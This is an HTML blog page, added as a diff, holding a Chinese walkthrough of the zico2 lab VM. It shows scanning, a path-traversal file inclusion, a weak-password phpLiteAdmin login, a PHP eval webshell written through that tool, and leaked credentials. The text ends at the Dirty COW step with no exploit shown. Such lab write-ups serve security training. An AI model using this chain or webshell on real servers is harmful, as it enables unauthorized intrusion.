@@ -1,0 +1,1169 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="GTL-JU">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/09/08/zico2靶机打靶记录/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="一、漏洞平台搭建我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。 我这里可以直接通过kali导入这个靶场  通过打开我们下载的ova文件导入靶场  我们这里设置导入虚拟机的名称和存放位置 然后点击导入就可以导入这个靶机了  然后我们开启靶机就行了  这里就启动">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zico2靶机打靶记录">
+<meta property="og:url" content="http://example.com/2023/09/08/zico2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、漏洞平台搭建我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。 我这里可以直接通过kali导入这个靶场  通过打开我们下载的ova文件导入靶场  我们这里设置导入虚拟机的名称和存放位置 然后点击导入就可以导入这个靶机了  然后我们开启靶机就行了  这里就启动">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172324367.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172503984.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172606614.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172731134.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906112007294.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113648922.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113816865.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907111909544.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131210092.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131613066.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131835473.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907132400583.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133017583.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133051115.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133250970.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133408575.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134334708.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135213443.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134132458.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135835527.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135415483.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135935783.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140556674.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141321927.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140815609.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141231935.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141356536.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142001637.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142111950.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142139159.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142424239.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907155900947.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160505475.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160922874.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161148341.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161444986.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161620764.png">
+<meta property="article:published_time" content="2023-09-08T03:35:01.000Z">
+<meta property="article:modified_time" content="2023-09-08T03:43:01.303Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透-靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172324367.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            zico2靶机打靶记录 -
+        
+        JU blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["php","java","比赛wp","环境搭建"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"JU's blog","subtitle":{"text":[],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"audios":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.evanluo.top/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/GTL-JU","Blog":"https://www.cnblogs.com/GTL-JU/","Friends":"/friends"}},"友链":{"icon":"fa-regular fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                JU blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-chart-bar"></i>
+                                        
+                                        状态
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a href="/friends">友情链接
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/links/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-link"></i>
+                                        
+                                        友链
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                             
+                                
+                                    <i class="fa-regular fa-chart-bar"></i>
+                                
+                                状态
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/friends">友情链接</a>
+                            </li>
+                        
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/links/"  >
+                             
+                                
+                                    <i class="fa-regular fa-link"></i>
+                                
+                                友链
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">zico2靶机打靶记录</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/logo.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">GTL-JU</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-09-08 11:35:01</span>
+        <span class="mobile">2023-09-08 11:35</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-09-08 11:43:01</span>
+            <span class="mobile">2023-09-08 11:43</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%B8%97%E9%80%8F-%E9%9D%B6%E6%9C%BA/">渗透-靶机</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h2 id="一、漏洞平台搭建"><a href="#一、漏洞平台搭建" class="headerlink" title="一、漏洞平台搭建"></a>一、漏洞平台搭建</h2><p>我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。</p>
+<p>我这里可以直接通过kali导入这个靶场</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172324367.png"
+                      alt="image-20230907172324367"
+                ></p>
+<p>通过打开我们下载的ova文件导入靶场</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172503984.png"
+                      alt="image-20230907172503984"
+                ></p>
+<p>我们这里设置导入虚拟机的名称和存放位置</p>
+<p>然后点击导入就可以导入这个靶机了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172606614.png"
+                      alt="image-20230907172606614"
+                ></p>
+<p>然后我们开启靶机就行了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172731134.png"
+                      alt="image-20230907172731134"
+                ></p>
+<p>这里就启动成功了</p>
+<h2 id="二、主机发现"><a href="#二、主机发现" class="headerlink" title="二、主机发现"></a>二、主机发现</h2><p>首先我们要先获取到目标靶机的ip地址</p>
+<p>由于目标靶机和kali在同一网段，我们这里直接用kali扫描网段存活主机</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906112007294.png"
+                      alt="image-20230906112007294"
+                ></p>
+<p>通过对网段存活主机的扫描可以得到我们目标靶机的ip地址</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>上面我们通过arp协议扫描到了目标靶机的ip地址</p>
+<p>但是为了能够进一步渗透我们需要对目标靶机进行信息收集</p>
+<p>nmap扫描目标靶机开放的端口</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.133 </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113648922.png"
+                      alt="image-20230906113648922"
+                ></p>
+<p>目标靶机开放了22端口和80端口</p>
+<p>说明目标靶机开放了web服务</p>
+<p>访问响应的web服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113816865.png"
+                      alt="image-20230906113816865"
+                ></p>
+<h2 id="三、漏洞扫描与利用"><a href="#三、漏洞扫描与利用" class="headerlink" title="三、漏洞扫描与利用"></a>三、漏洞扫描与利用</h2><p>访问网站可以看到这是一个类似于商店类型的网站</p>
+<p>首先就是对网站的各个功能点，页面进行测试，看看能不能找到利用的点</p>
+<p>在对网站功能进行查看的时候可以看到在 Service存在一个跳转按钮</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907111909544.png"
+                      alt="image-20230907111909544"
+                ></p>
+<p>点击后跳转到了一个商品页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131210092.png"
+                      alt="image-20230907131210092"
+                ></p>
+<p>我们可以看到这个所传递的参数和路由</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://192.168.113.133/view.php?page=tools.html" >http://192.168.113.133/view.php?page=tools.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这里猜测后台处理逻辑是通过page参数将我们要访问的页面传递给view.php进行处理后将相应的页面传递给前端。</p>
+<p>我们这里把参数值改为index.html</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131613066.png"
+                      alt="image-20230907131613066"
+                ></p>
+<p>可以看到成功返回了首页面</p>
+<p>但是只能返回设定路径下的文件</p>
+<p>比如我们这里尝试返回根目录下的&#x2F;etc&#x2F;passwd</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131835473.png"
+                      alt="image-20230907131835473"
+                ></p>
+<p>回显是空，说明这个只能返回对应目录下的文件，但是如果网站过滤不严格的话，我们完全可以通过..&#x2F;向上一级跳跃</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907132400583.png"
+                      alt="image-20230907132400583"
+                ></p>
+<p>读取成功，说明这里存在文件包含漏洞</p>
+<p>但是这个漏洞也只是可以让我们对服务器的一下文件进行读取和查看，并不能帮助我们直接拿下这台服务器</p>
+<p>其他的功能点并没有找到明显可以利用的漏洞</p>
+<p>通过dirsearch工具对网站目录进行扫描</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.133</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133017583.png"
+                      alt="image-20230907133017583"
+                ></p>
+<p>很明显这里存在一个dbadmin路由</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133051115.png"
+                      alt="image-20230907133051115"
+                ></p>
+<p>访问可以发现存在两个页面一个是首页，另外一个是执行数据库操作的文件</p>
+<p>访问test_db.php</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133250970.png"
+                      alt="image-20230907133250970"
+                ></p>
+<p>尝试弱口令登录</p>
+<p>admin可以登录成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133408575.png"
+                      alt="image-20230907133408575"
+                ></p>
+<p>这是一个对数据库进行操作的页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134334708.png"
+                      alt="image-20230907134334708"
+                ></p>
+<p>在数据库中我们可以得到两组账号密码</p>
+<p>密码是被md5加密的，进行md5解密</p>
+<p>可以得到两组账号密码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root：34kroot34</span><br><span class="line">zico: zico2215@</span><br></pre></td></tr></table></figure></div>
+
+<p>尝试ssh登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135213443.png"
+                      alt="image-20230907135213443"
+                ></p>
+<p>登录失败</p>
+<p>这是一个管理 SQLite 数据库的开源 web 应用程序phpLiteAdmin 而且我们还给出了版本号</p>
+<p>通过漏洞工具searchsploit去查询对应版本所存在的漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134132458.png"
+                      alt="image-20230907134132458"
+                ></p>
+<p>存在远程代码注入漏洞</p>
+<p>那我们可以通过这个漏洞写入后门文件。然后通过文件包含漏洞访问这个后门文件进行shell利用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135835527.png"
+                      alt="image-20230907135835527"
+                ></p>
+<p>创建的数据库文件是存在于&#x2F;user&#x2F;databases下的</p>
+<p>并且对文件后缀并没有限制</p>
+<p>那我们就可以创建一个php后门文件</p>
+<p>然后在文件中写入一句话木马</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135415483.png"
+                      alt="image-20230907135415483"
+                ></p>
+<p>创建一个shell.php文件</p>
+<p>设置表名和表的数量</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135935783.png"
+                      alt="image-20230907135935783"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140556674.png"
+                      alt="image-20230907140556674"
+                ></p>
+<p>在default value值出写入我们的一句话木马</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>点击创建我们的木马文件就成功写入了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141321927.png"
+                      alt="image-20230907141321927"
+                ></p>
+<p>但是因为我们写入的后门文件是在&#x2F;usr&#x2F;databases下</p>
+<p>不能直接访问</p>
+<p>所以我们这里通过前面的文件包含漏洞包含到这个后门文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140815609.png"
+                      alt="image-20230907140815609"
+                ></p>
+<p>蚁剑连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141231935.png"
+                      alt="image-20230907141231935"
+                ></p>
+<p>成功进入到服务器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141356536.png"
+                      alt="image-20230907141356536"
+                ></p>
+<p>然后在服务器文件中</p>
+<p>查找靶机中有没有存在敏感信息。最终在家目录中wordpress中的配置文件<code>wp-config.php</code>中找到了<code>zico</code>账号和密码 <code>sWfCsfJSPV9H3AmQzw8</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142001637.png"
+                      alt="image-20230907142001637"
+                ></p>
+<p>尝试ssh登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142111950.png"
+                      alt="image-20230907142111950"
+                ></p>
+<p>登录成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142139159.png"
+                      alt="image-20230907142139159"
+                ></p>
+<p>但是可以看到这个账号只是普通用户权限</p>
+<p>我们要拿下这太服务器就要把权限提升到root权限</p>
+<h2 id="四、脏牛提权"><a href="#四、脏牛提权" class="headerlink" title="四、脏牛提权"></a>四、脏牛提权</h2><p>查看一下内核版本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142424239.png"
+                      alt="image-20230907142424239"
+                ></p>
+<p>内核版本是3.2.0，那我们这里可以内核漏洞进行脏牛提权，脏牛漏洞影响版本低于3.9的liunx内核</p>
+<p>利用exp：</p>
